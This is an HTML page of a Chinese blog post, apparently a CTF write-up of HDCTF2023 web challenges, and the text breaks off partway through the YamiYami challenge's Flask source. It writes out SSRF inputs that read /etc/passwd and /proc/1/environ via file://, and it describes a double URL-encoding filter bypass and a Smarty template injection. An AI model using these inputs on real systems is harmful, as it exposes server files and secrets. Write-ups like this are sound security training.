@@ -1,0 +1,1004 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/fluid.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="leekos">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="【HDCTF2023】wp[TOC] webWelcome To HDCTF 2023在源码的 game.js中找到了flag  在控制台输出 console.log(seeeeeeeecret)得flag SearchMaster使用dirmap扫描目录，发现：composer.json，访问一下： 123456789101112131415161718192021222324252627282">
+<meta property="og:type" content="article">
+<meta property="og:title" content="HDCTF2023">
+<meta property="og:url" content="https://leekosss.github.io/2023/08/24/HDCTF2023/index.html">
+<meta property="og:site_name" content="Tranquility">
+<meta property="og:description" content="【HDCTF2023】wp[TOC] webWelcome To HDCTF 2023在源码的 game.js中找到了flag  在控制台输出 console.log(seeeeeeeecret)得flag SearchMaster使用dirmap扫描目录，发现：composer.json，访问一下： 123456789101112131415161718192021222324252627282">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://s2.loli.net/2023/04/23/J7VbOSAQ5RPTemE.png">
+<meta property="og:image" content="https://s2.loli.net/2023/04/23/RZek9xBPizXCM3u.png">
+<meta property="og:image" content="https://s2.loli.net/2023/04/23/eHrD8dGWljBgfvO.png">
+<meta property="og:image" content="https://s2.loli.net/2023/04/23/k5AqdwPLGaz9XrC.png">
+<meta property="og:image" content="https://s2.loli.net/2023/04/23/nJmBkxYw3PaOfrF.png">
+<meta property="og:image" content="https://s2.loli.net/2023/04/23/gQ8YnFWyh2HAJak.png">
+<meta property="og:image" content="https://s2.loli.net/2023/04/23/agHbZnvudWrm6to.png">
+<meta property="og:image" content="https://s2.loli.net/2023/04/23/GRhokPMEr7q1J43.png">
+<meta property="og:image" content="https://s2.loli.net/2023/04/28/qzVHPOj3irdvxa6.png">
+<meta property="og:image" content="https://s2.loli.net/2023/04/28/Kpf23XZuvmSrBEG.png">
+<meta property="og:image" content="https://s2.loli.net/2023/04/28/xG42dwNWDjXIr7K.png">
+<meta property="og:image" content="https://s2.loli.net/2023/04/28/g9OC581ytisKUVb.png">
+<meta property="og:image" content="https://s2.loli.net/2023/04/28/KgwbrZAGf2TLnNk.png">
+<meta property="og:image" content="https://s2.loli.net/2023/04/28/uZD1X4zqpAjTcsU.png">
+<meta property="og:image" content="https://s2.loli.net/2023/04/28/chQam2LvRYqZUuD.png">
+<meta property="og:image" content="https://s2.loli.net/2023/04/28/KZU5rnYScgzbHsA.png">
+<meta property="og:image" content="https://s2.loli.net/2023/04/23/GhX91m7y3JwE85Y.png">
+<meta property="og:image" content="https://s2.loli.net/2023/04/23/rtYn4WiP9T2D7Io.png">
+<meta property="og:image" content="https://s2.loli.net/2023/04/23/Qsg7HvIrREJfYFN.png">
+<meta property="og:image" content="https://s2.loli.net/2023/04/23/yma7of36rFAWenx.png">
+<meta property="og:image" content="https://s2.loli.net/2023/04/23/Qi3aLjHIevkZFd4.png">
+<meta property="og:image" content="https://s2.loli.net/2023/04/28/QkzTJGgnpCYmEwq.png">
+<meta property="og:image" content="https://s2.loli.net/2023/04/28/iSUQgdNza9xtkAT.png">
+<meta property="og:image" content="https://s2.loli.net/2023/04/28/HD6uw28tZUVKPxk.png">
+<meta property="og:image" content="https://s2.loli.net/2023/04/23/Cpm6MVAWPBNkRhn.png">
+<meta property="og:image" content="https://s2.loli.net/2023/04/23/PZ7zjbhpCr8K9IL.png">
+<meta property="og:image" content="https://s2.loli.net/2023/04/23/OTIaA9qfQHRj4Mr.png">
+<meta property="og:image" content="https://s2.loli.net/2023/04/23/UKqwkQuHBLi73Sm.png">
+<meta property="og:image" content="https://s2.loli.net/2023/04/23/Dkm7UM6NtRAZQIP.png">
+<meta property="og:image" content="https://s2.loli.net/2023/04/23/8dBH2RcpnGUzJWS.png">
+<meta property="og:image" content="https://s2.loli.net/2023/04/23/4gwfGaDMRi3b8nK.png">
+<meta property="og:image" content="https://s2.loli.net/2023/04/23/IZ4RtANWpmS6jaX.png">
+<meta property="og:image" content="https://s2.loli.net/2023/04/23/ybx4SM7QNpPejmv.png">
+<meta property="og:image" content="https://s2.loli.net/2023/04/23/KhmEnls6vfUA9Jy.png">
+<meta property="og:image" content="https://s2.loli.net/2023/04/24/d4aDEFOrGCnI2Bc.png">
+<meta property="og:image" content="https://s2.loli.net/2023/04/24/2gQl7wZbHjv3Kcn.png">
+<meta property="og:image" content="https://s2.loli.net/2023/04/24/6CNQvSDTL7zhA3e.png">
+<meta property="og:image" content="https://s2.loli.net/2023/04/24/QpPNzuAmXBrG6lS.png">
+<meta property="og:image" content="https://s2.loli.net/2023/04/24/1ymDXsz8wGaQ9AM.png">
+<meta property="og:image" content="https://s2.loli.net/2023/04/24/YElLXTxviS9On6a.png">
+<meta property="og:image" content="https://s2.loli.net/2023/04/24/nN4T6iSy9M3DHCY.png">
+<meta property="og:image" content="https://s2.loli.net/2023/04/24/E7ZV2Hvc1bNsSoq.png">
+<meta property="og:image" content="https://s2.loli.net/2023/04/24/rJQ4NvpdW2qw7bz.png">
+<meta property="og:image" content="https://s2.loli.net/2023/04/24/idZaephToUvDLnk.png">
+<meta property="og:image" content="https://s2.loli.net/2023/04/24/wJNdqZlxGfjOgnM.png">
+<meta property="og:image" content="https://s2.loli.net/2023/04/24/9b837dPALXVORsz.png">
+<meta property="og:image" content="https://s2.loli.net/2023/04/24/oOVudAp26UGvFlM.png">
+<meta property="article:published_time" content="2023-08-24T14:38:04.582Z">
+<meta property="article:modified_time" content="2023-06-05T06:58:39.987Z">
+<meta property="article:author" content="leekos">
+<meta property="article:tag" content="HDCTF2023">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://s2.loli.net/2023/04/23/J7VbOSAQ5RPTemE.png">
+  
+  
+    <meta name="referrer" content="no-referrer-when-downgrade">
+  
+  
+  <title>HDCTF2023 - Tranquility</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"leekosss.github.io","root":"/","version":"1.9.5-a","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>Tranquility</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/links/">
+                <i class="iconfont icon-link-fill"></i>
+                <span>友链</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="HDCTF2023"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2023-08-24 22:38" pubdate>
+          2023年8月24日 晚上
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          13k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          111 分钟
+        
+      </span>
+    
+
+    
+    
+      
+        <span id="busuanzi_container_page_pv" style="display: none">
+          <i class="iconfont icon-eye" aria-hidden="true"></i>
+          <span id="busuanzi_value_page_pv"></span> 次
+        </span>
+        
+      
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">HDCTF2023</h1>
+            
+              <p class="note note-info">
+                
+                  
+                    本文最后更新于：2023年6月5日 下午
+                  
+                
+              </p>
+            
+            
+              <div class="markdown-body">
+                
+                <h2 id="【HDCTF2023】wp"><a href="#【HDCTF2023】wp" class="headerlink" title="【HDCTF2023】wp"></a>【HDCTF2023】wp</h2><p>[TOC]</p>
+<h3 id="web"><a href="#web" class="headerlink" title="web"></a>web</h3><h4 id="Welcome-To-HDCTF-2023"><a href="#Welcome-To-HDCTF-2023" class="headerlink" title="Welcome To HDCTF 2023"></a>Welcome To HDCTF 2023</h4><p>在源码的 <code>game.js</code>中找到了flag</p>
+<p><img src="https://s2.loli.net/2023/04/23/J7VbOSAQ5RPTemE.png" srcset="/img/loading.gif" lazyload alt="image-20230423142427742"></p>
+<p>在控制台输出 <code>console.log(seeeeeeeecret)</code>得flag</p>
+<h4 id="SearchMaster"><a href="#SearchMaster" class="headerlink" title="SearchMaster"></a>SearchMaster</h4><p>使用dirmap扫描目录，发现：<code>composer.json</code>，访问一下：</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br>    <span class="hljs-attr">&quot;name&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;smarty/smarty&quot;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;library&quot;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;description&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;Smarty - the compiling PHP template engine&quot;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;keywords&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><br>        <span class="hljs-string">&quot;templating&quot;</span><br>    <span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;homepage&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;https://smarty-php.github.io/smarty/&quot;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;license&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;LGPL-3.0&quot;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;authors&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><br>        <span class="hljs-punctuation">&#123;</span><br>            <span class="hljs-attr">&quot;name&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;Monte Ohrt&quot;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;email&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;monte@ohrt.com&quot;</span><br>        <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-punctuation">&#123;</span><br>            <span class="hljs-attr">&quot;name&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;Uwe Tews&quot;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;email&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;uwe.tews@googlemail.com&quot;</span><br>        <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-punctuation">&#123;</span><br>            <span class="hljs-attr">&quot;name&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;Rodney Rehm&quot;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;email&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;rodney.rehm@medialize.de&quot;</span><br>        <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-punctuation">&#123;</span><br>            <span class="hljs-attr">&quot;name&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;Simon Wisselink&quot;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;homepage&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;https://www.iwink.nl/&quot;</span><br>        <span class="hljs-punctuation">&#125;</span><br>    <span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;support&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>        <span class="hljs-attr">&quot;issues&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;https://github.com/smarty-php/smarty/issues&quot;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-attr">&quot;forum&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;https://github.com/smarty-php/smarty/discussions&quot;</span><br>    <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;require&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>        <span class="hljs-attr">&quot;php&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;^7.1 || ^8.0&quot;</span><br>    <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;autoload&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>        <span class="hljs-attr">&quot;classmap&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><br>            <span class="hljs-string">&quot;libs/&quot;</span><br>        <span class="hljs-punctuation">]</span><br>    <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;extra&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>        <span class="hljs-attr">&quot;branch-alias&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>            <span class="hljs-attr">&quot;dev-master&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;4.0.x-dev&quot;</span><br>        <span class="hljs-punctuation">&#125;</span><br>    <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;require-dev&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>        <span class="hljs-attr">&quot;phpunit/phpunit&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;^8.5 || ^7.5&quot;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-attr">&quot;smarty/smarty-lexer&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;^3.1&quot;</span><br>    <span class="hljs-punctuation">&#125;</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure>
+
+<p>发现是 php <code>smarty模板注入</code></p>
+<p><img src="https://s2.loli.net/2023/04/23/RZek9xBPizXCM3u.png" srcset="/img/loading.gif" lazyload alt="image-20230423143014048"></p>
+<p>提示我们需要使用post方式上传一个名为 data的变量：</p>
+<p>测试一下确实有回显：</p>
+<p><img src="https://s2.loli.net/2023/04/23/eHrD8dGWljBgfvO.png" srcset="/img/loading.gif" lazyload alt="image-20230423143124024"></p>
+<p>直接读flag：</p>
+<p><img src="https://s2.loli.net/2023/04/23/k5AqdwPLGaz9XrC.png" srcset="/img/loading.gif" lazyload alt="image-20230423143218303"></p>
+<h4 id="YamiYami"><a href="#YamiYami" class="headerlink" title="YamiYami"></a>YamiYami</h4><p>进入题目：</p>
+<p><img src="https://s2.loli.net/2023/04/23/nJmBkxYw3PaOfrF.png" srcset="/img/loading.gif" lazyload alt="image-20230423143948531"></p>
+<p>当我们点击 <code>Read somethings</code>时：</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span>node2.anna.nssctf.cn:<span class="hljs-number">28523</span><span class="hljs-regexp">/read?url=https:/</span><span class="hljs-regexp">/baidu.com</span><br></code></pre></td></tr></table></figure>
+
+<p>我们发现可以读取到百度首页的内容，这是<strong>SSRF</strong>（突然忘记了）</p>
+<p>python中我们可以使用 <code>file伪协议</code>读取文件内容</p>
+<p>我们尝试一下读取 <code>/etc/passwd</code></p>
+<p><img src="https://s2.loli.net/2023/04/23/gQ8YnFWyh2HAJak.png" srcset="/img/loading.gif" lazyload alt="image-20230423144508490"></p>
+<p>成功读取</p>
+<p>非预期解：（直接读取环境变量）</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">file:<span class="hljs-regexp">//</span><span class="hljs-regexp">/proc/</span><span class="hljs-number">1</span>/environ   <span class="hljs-comment"># 这里读的是pid为1的进程</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="https://s2.loli.net/2023/04/23/agHbZnvudWrm6to.png" srcset="/img/loading.gif" lazyload alt="image-20230423144607816"></p>
+<p>如果读取当前进程的环境变量是读取不到的：</p>
+<p><img src="https://s2.loli.net/2023/04/23/GRhokPMEr7q1J43.png" srcset="/img/loading.gif" lazyload alt="image-20230423145412951"></p>
+<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/10579">Linux-Proc目录的利用</a></p>
+<p>预期解：</p>
+<p>我们进去发现了三个路由，但是第一个read路由可以读取指定url的内容，易知这是<code>SSRF</code></p>
+<img src="https://s2.loli.net/2023/04/28/qzVHPOj3irdvxa6.png" srcset="/img/loading.gif" lazyload alt="image-20230428111516922" style="zoom:33%;" />
+
+<p>我们点击 pwd，显示 <code>/app</code>，说明此时文件在<code>/app</code>目录下面</p>
+<p>由于这是python写的题，我们很容易猜到文件名是 <code>app.py</code></p>
+<p>于是我们想要使用file协议去读取 <code>/app/app.py</code>文件</p>
+<p><img src="https://s2.loli.net/2023/04/28/Kpf23XZuvmSrBEG.png" srcset="/img/loading.gif" lazyload alt="image-20230428111931565"></p>
+<p>结果<code>app</code>被过滤了</p>
+<p>这里我们可以将 <code>app</code>字段<strong>两次url编码绕过</strong></p>
+<p><img src="https://s2.loli.net/2023/04/28/xG42dwNWDjXIr7K.png" srcset="/img/loading.gif" lazyload alt="image-20230428112210448"></p>
+<p>获得源码：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><code class="hljs python"><br><span class="hljs-comment">#encoding:utf-8</span><br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">import</span> re, random, uuid<br><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> werkzeug.utils <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> yaml<br><span class="hljs-keyword">from</span> urllib.request <span class="hljs-keyword">import</span> urlopen<br>app = Flask(__name__)<br>random.seed(uuid.getnode())<br>app.config[<span class="hljs-string">&#x27;SECRET_KEY&#x27;</span>] = <span class="hljs-built_in">str</span>(random.random()*<span class="hljs-number">233</span>)<br>app.debug = <span class="hljs-literal">False</span><br>BLACK_LIST=[<span class="hljs-string">&quot;yaml&quot;</span>,<span class="hljs-string">&quot;YAML&quot;</span>,<span class="hljs-string">&quot;YML&quot;</span>,<span class="hljs-string">&quot;yml&quot;</span>,<span class="hljs-string">&quot;yamiyami&quot;</span>]<br>app.config[<span class="hljs-string">&#x27;UPLOAD_FOLDER&#x27;</span>]=<span class="hljs-string">&quot;/app/uploads&quot;</span><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/&#x27;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">index</span>():<br>    session[<span class="hljs-string">&#x27;passport&#x27;</span>] = <span class="hljs-string">&#x27;YamiYami&#x27;</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">    Welcome to HDCTF2023 &lt;a href=&quot;/read?url=https://baidu.com&quot;&gt;Read somethings&lt;/a&gt;</span><br><span class="hljs-string">    &lt;br&gt;</span><br><span class="hljs-string">    Here is the challenge &lt;a href=&quot;/upload&quot;&gt;Upload file&lt;/a&gt;</span><br><span class="hljs-string">    &lt;br&gt;</span><br><span class="hljs-string">    Enjoy it &lt;a href=&quot;/pwd&quot;&gt;pwd&lt;/a&gt;</span><br><span class="hljs-string">    &#x27;&#x27;&#x27;</span><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/pwd&#x27;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">pwd</span>():<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">str</span>(pwdpath)<br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/read&#x27;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">read</span>():<br>    <span class="hljs-keyword">try</span>:<br>        url = request.args.get(<span class="hljs-string">&#x27;url&#x27;</span>)<br>        m = re.findall(<span class="hljs-string">&#x27;app.*&#x27;</span>, url, re.IGNORECASE)<br>        n = re.findall(<span class="hljs-string">&#x27;flag&#x27;</span>, url, re.IGNORECASE)<br>        <span class="hljs-keyword">if</span> m:<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;re.findall(&#x27;app.*&#x27;, url, re.IGNORECASE)&quot;</span><br>        <span class="hljs-keyword">if</span> n:<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;re.findall(&#x27;flag&#x27;, url, re.IGNORECASE)&quot;</span><br>        res = urlopen(url)<br>        <span class="hljs-keyword">return</span> res.read()<br>    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> ex:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-built_in">str</span>(ex))<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;no response&#x27;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">allowed_file</span>(<span class="hljs-params">filename</span>):<br>   <span class="hljs-keyword">for</span> blackstr <span class="hljs-keyword">in</span> BLACK_LIST:<br>       <span class="hljs-keyword">if</span> blackstr <span class="hljs-keyword">in</span> filename:<br>           <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br>   <span class="hljs-keyword">return</span> <span 